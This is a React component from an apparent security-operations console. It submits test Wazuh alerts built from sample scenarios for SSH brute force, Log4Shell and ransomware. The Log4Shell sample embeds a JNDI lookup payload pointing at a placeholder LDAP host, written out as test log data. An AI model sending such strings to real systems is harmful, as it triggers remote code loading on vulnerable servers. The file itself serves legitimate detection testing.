import { useState } from 'react';
import { Alert, App, Input, Modal, Select } from 'antd';
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { api, body } from '../api';
import { useSession } from '../context';

const samples = {
  ssh: { name: 'SSH authentication failures', level: 8, description: 'Repeated SSH authentication failures on a monitored host', mitre: 'T1110', log: 'sshd: Failed password for invalid user admin from 192.0.2.10 port 43122 ssh2' },
  log4j: { name: 'Log4Shell lookup attempt', level: 12, description: 'Log4j JNDI lookup pattern detected in application request', mitre: 'T1190', log: 'GET /search?q=${jndi:ldap://example.invalid/test} HTTP/1.1' },
  ransomware: { name: 'Suspicious file encryption', level: 13, description: 'Potential ransomware: rapid file encryption activity', mitre: 'T1486', log: 'File monitor: 250 files renamed to .locked within a 10-second window' },
};

export function IngestModal({ open, close }: { open: boolean; close: () => void }) {
  const { orgId } = useSession();
  const query = useQueryClient();
  const { message } = App.useApp();
  const [sample, setSample] = useState<keyof typeof samples>('ssh');
  const [custom, setCustom] = useState('');
  function payload() {
    const value = samples[sample];
    return { id: `console-${crypto.randomUUID()}`, rule: { id: 100001, level: value.level, description: value.description, mitre: { id: value.mitre } }, agent: { id: 'console-test', name: 'Training endpoint' }, full_log: value.log, timestamp: new Date().toISOString() };
  }
  const mutation = useMutation({
    mutationFn: async () => {
      let value: unknown;
      try { value = custom ? JSON.parse(custom) : payload(); } catch { throw new Error('The payload must be valid JSON.'); }
      return api('/wazuh', orgId, body('POST', value));
    },
    onSuccess: () => { void query.invalidateQueries({ queryKey: ['incidents', orgId] }); message.success('Alert submitted'); close(); setCustom(''); },
  });
  return <Modal title="Submit a test alert" open={open} onCancel={close} okText="Submit alert" onOk={() => mutation.mutate()} confirmLoading={mutation.isPending} width={660} destroyOnHidden>
    <p className="muted">Creates investigation data in this organization using the configured pipeline. Notification channels may receive this alert.</p>
    <Select aria-label="Test scenario" className="full-width" value={sample} options={Object.entries(samples).map(([value, item]) => ({ value, label: item.name }))} onChange={value => { setSample(value); setCustom(''); mutation.reset(); }} />
    <label className="field-label">Alert payload <span>Optional JSON override</span></label><Input.TextArea aria-label="Alert JSON" rows={9} className="mono" value={custom} placeholder={JSON.stringify(payload(), null, 2)} onChange={event => setCustom(event.target.value)} />
    {mutation.error && <Alert type="error" showIcon title={mutation.error.message} className="form-alert" />}
  </Modal>;
}
